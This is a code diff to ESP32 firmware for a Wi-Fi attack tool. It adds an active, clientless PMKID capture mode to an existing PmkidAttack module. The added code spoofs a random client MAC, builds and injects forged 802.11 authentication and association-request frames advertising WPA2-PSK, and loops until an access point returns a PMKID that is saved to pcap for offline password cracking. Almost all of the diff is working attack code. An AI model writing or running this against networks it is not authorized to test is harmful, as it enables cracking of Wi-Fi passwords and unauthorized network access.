@@ -14,6 +14,8 @@
 #include "beacon_build.h"
 #include "dot11.h"
 #include "wpa_crack.h"
+#include "mac_util.h"      // randomLaMac — spoofed client identity for active solicitation
+#include <esp_wifi.h>
 #include <SD.h>
 
 extern InputHandling inputHandler;
@@ -106,6 +108,58 @@ static void IRAM_ATTR rxCallback(void* buf, wifi_promiscuous_pkt_type_t pktType)
     pmHead = next;
 }
 
+// ── Active PMKID solicitation (clientless) ────────────────────────────────────
+// The passive path above only sees a PMKID when a real client associates on its own.
+// To pull one from a CLIENTLESS AP we become the client ourselves: spoof a client MAC
+// (so the HW auto-ACKs the AP's replies → the AP proceeds past auth/assoc to M1),
+// inject an open Authentication then an Association Request carrying a WPA2-PSK RSN IE.
+// A PMKID-caching AP then sends EAPOL M1 with the PMKID KDE, which the same rxCallback
+// captures. Proven ESP32 route (Sablina-Tamagotchi / HaleHound; method only). §14a.
+static bool g_pmSolicit = false;
+
+// open-system Authentication request (client→AP). Returns frame length (30).
+static uint16_t pmBuildAuth(uint8_t* out, const uint8_t* ap, const uint8_t* sta) {
+    uint16_t i = 0;
+    out[i++] = 0xB0; out[i++] = 0x00;                 // FC: mgmt / auth
+    out[i++] = 0x00; out[i++] = 0x00;                 // duration
+    memcpy(out + i, ap,  6); i += 6;                  // A1 = AP (DA)
+    memcpy(out + i, sta, 6); i += 6;                  // A2 = our spoofed STA (SA)
+    memcpy(out + i, ap,  6); i += 6;                  // A3 = BSSID
+    out[i++] = 0x00; out[i++] = 0x00;                 // seq
+    out[i++] = 0x00; out[i++] = 0x00;                 // auth algorithm = open system
+    out[i++] = 0x01; out[i++] = 0x00;                 // auth transaction seq = 1
+    out[i++] = 0x00; out[i++] = 0x00;                 // status code = 0
+    return i;
+}
+
+// Association Request (client→AP) advertising WPA2-PSK / CCMP — makes the AP send M1.
+static uint16_t pmBuildAssoc(uint8_t* out, const uint8_t* ap, const uint8_t* sta, const char* ssid) {
+    uint16_t i = 0;
+    out[i++] = 0x00; out[i++] = 0x00;                 // FC: mgmt / assoc-request
+    out[i++] = 0x00; out[i++] = 0x00;                 // duration
+    memcpy(out + i, ap,  6); i += 6;                  // A1
+    memcpy(out + i, sta, 6); i += 6;                  // A2
+    memcpy(out + i, ap,  6); i += 6;                  // A3
+    out[i++] = 0x00; out[i++] = 0x00;                 // seq
+    out[i++] = 0x31; out[i++] = 0x04;                 // capability info (ESS+Privacy+ShortPre/Slot)
+    out[i++] = 0x0A; out[i++] = 0x00;                 // listen interval
+    uint8_t sl = ssid ? (uint8_t)strnlen(ssid, 32) : 0;
+    out[i++] = 0x00; out[i++] = sl;                   // SSID IE
+    for (uint8_t k = 0; k < sl; k++) out[i++] = ssid[k];
+    out[i++] = 0x01; out[i++] = 0x08;                 // Supported Rates IE
+    out[i++] = 0x82; out[i++] = 0x84; out[i++] = 0x8B; out[i++] = 0x96;
+    out[i++] = 0x24; out[i++] = 0x30; out[i++] = 0x48; out[i++] = 0x6C;
+    static const uint8_t rsn[] = {                    // RSN IE: WPA2-PSK, CCMP group+pairwise
+        0x30, 0x14, 0x01, 0x00,
+        0x00, 0x0F, 0xAC, 0x04,                       // group cipher = CCMP
+        0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04,           // pairwise = CCMP
+        0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,           // AKM = PSK
+        0x00, 0x00                                    // RSN capabilities
+    };
+    memcpy(out + i, rsn, sizeof(rsn)); i += sizeof(rsn);
+    return i;
+}
+
 // ── Constructor ───────────────────────────────────────────────────────────────
 PmkidAttack::PmkidAttack(DisplayManager& dm, WiFiFunctions& wf, DeauthAttack& da)
     : _dm(dm), _wf(wf), _da(da) {}
@@ -128,8 +182,9 @@ String PmkidAttack::macStr(const uint8_t* m) {
 void PmkidAttack::start(char* args) {
     if (!args || !*args) {
         _dm.println("Usage:");
-        _dm.println("  pm <index>");
-        _dm.println("  pm <bssid> [ch]");
+        _dm.println("  pm <index>              (passive)");
+        _dm.println("  pm assoc <index>        (active/clientless)");
+        _dm.println("  pm [assoc] <bssid> [ch]");
         _dm.printCommandScreen();
         return;
     }
@@ -139,6 +194,13 @@ void PmkidAttack::start(char* args) {
     buf[sizeof(buf) - 1] = '\0';
 
     char* first  = strtok(buf, " ");
+    // optional leading flag: `pm assoc ...` / `pm a ...` = ACTIVE clientless solicitation
+    g_pmSolicit = false;
+    if (first && (!strcmp(first, "assoc") || !strcmp(first, "a") || !strcmp(first, "solicit"))) {
+        g_pmSolicit = true;
+        first = strtok(nullptr, " ");           // advance to the real target arg
+    }
+    if (!first) { _dm.println("Usage: pm assoc <index|bssid> [ch]"); _dm.printCommandScreen(); return; }
     char* second = strtok(nullptr, " ");
 
     uint8_t bssid[6];
@@ -398,8 +460,17 @@ void PmkidAttack::run(const uint8_t* bssid, int channel, const char* ssid) {
         if (fileOk) pcap::writeGlobalHeader(pcap);
     }
 
-    // WiFi: APSTA (needed for deauth injection to trigger re-association)
+    // WiFi: APSTA (AP iface = reliable raw injection; STA iface = our client identity)
     WiFi.mode(WIFI_MODE_APSTA);
+    // ACTIVE mode: spoof a client MAC on the STA iface BEFORE the softAP comes up, so the
+    // HW auto-ACKs the AP's auth/assoc replies (else the AP never reaches M1). Restored on
+    // exit. Set-mac while APSTA-running is proven on this stack (karma roguehs pattern).
+    uint8_t origMac[6] = {0}, staMac[6] = {0};
+    if (g_pmSolicit) {
+        esp_wifi_get_mac(WIFI_IF_STA, origMac);
+        randomLaMac(staMac);
+        esp_wifi_set_mac(WIFI_IF_STA, staMac);
+    }
     WiFi.softAP("x", nullptr, channel, 1, 0, false);
     vTaskDelay(pdMS_TO_TICKS(100));
 
@@ -416,6 +487,7 @@ void PmkidAttack::run(const uint8_t* bssid, int channel, const char* ssid) {
 
     uint32_t m1Count    = 0;
     uint32_t lastRefresh = 0;
+    uint32_t lastSolicit = 0;
 
     auto redrawStatus = [&]() {
         _dm.fillRect(10, statusY, 310, LINE_HEIGHT * 4 + 2, TFT_BLACK);
@@ -437,9 +509,11 @@ void PmkidAttack::run(const uint8_t* bssid, int channel, const char* ssid) {
             _dm.setTextColor(0x7BEF); _dm.println(line);
             _dm.setCursor(10, _dm.getCursorY());
             _dm.setTextColor(0x4208);
-            _dm.println(m1Count ? "M1 seen — no PMKID in Key Data" : "Waiting for EAPOL M1...");
+            _dm.println(m1Count ? "M1 seen — no PMKID in Key Data"
+                                : (g_pmSolicit ? "Soliciting M1 (assoc)..." : "Waiting for EAPOL M1..."));
             _dm.setCursor(10, _dm.getCursorY());
-            _dm.setTextColor(0x4208); _dm.println("[q] stop");
+            _dm.setTextColor(g_pmSolicit ? TFT_YELLOW : (uint16_t)0x4208);
+            _dm.println(g_pmSolicit ? "[ACTIVE clientless]  [q] stop" : "[q] stop");
         }
         _dm.setTextColor(TFT_WHITE);
     };
@@ -501,6 +575,7 @@ void PmkidAttack::run(const uint8_t* bssid, int channel, const char* ssid) {
             g_pmCapture = false;
             esp_wifi_set_promiscuous_rx_cb(nullptr);
             esp_wifi_set_promiscuous(false);
+            if (g_pmSolicit) esp_wifi_set_mac(WIFI_IF_STA, origMac);   // restore real STA MAC
             WiFi.softAPdisconnect(true);
             WiFi.mode(WIFI_STA);
             finalizePcap();
@@ -545,6 +620,21 @@ void PmkidAttack::run(const uint8_t* bssid, int channel, const char* ssid) {
         }
 
         uint32_t now = millis();
+
+        // ACTIVE SOLICIT: pull M1/PMKID from a clientless AP — inject open Auth, then
+        // (after the AP's auth-resp lands) an Assoc-Request advertising WPA2-PSK. The AP
+        // replies to our spoofed STA MAC (HW-ACK'd) and sends M1 with the PMKID KDE, which
+        // rxCallback captures. Re-tried every 800ms until captured. AP iface = reliable TX.
+        if (g_pmSolicit && !g_pm.hasPmkid && now - lastSolicit >= 800) {
+            lastSolicit = now;
+            uint8_t fr[128];
+            uint16_t n = pmBuildAuth(fr, (const uint8_t*)g_pmBssid, staMac);
+            esp_wifi_80211_tx(WIFI_IF_AP, fr, n, false);
+            vTaskDelay(pdMS_TO_TICKS(40));                 // let the auth-response land + be ACK'd
+            n = pmBuildAssoc(fr, (const uint8_t*)g_pmBssid, staMac, g_pm.ssid);
+            esp_wifi_80211_tx(WIFI_IF_AP, fr, n, false);
+        }
+
         if (now - lastRefresh >= 300) {
             lastRefresh = now;
             redrawStatus();
@@ -555,6 +645,7 @@ void PmkidAttack::run(const uint8_t* bssid, int channel, const char* ssid) {
     g_pmCapture = false;
     esp_wifi_set_promiscuous_rx_cb(nullptr);
     esp_wifi_set_promiscuous(false);
+    if (g_pmSolicit) esp_wifi_set_mac(WIFI_IF_STA, origMac);   // restore real STA MAC
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_STA);
     finalizePcap();
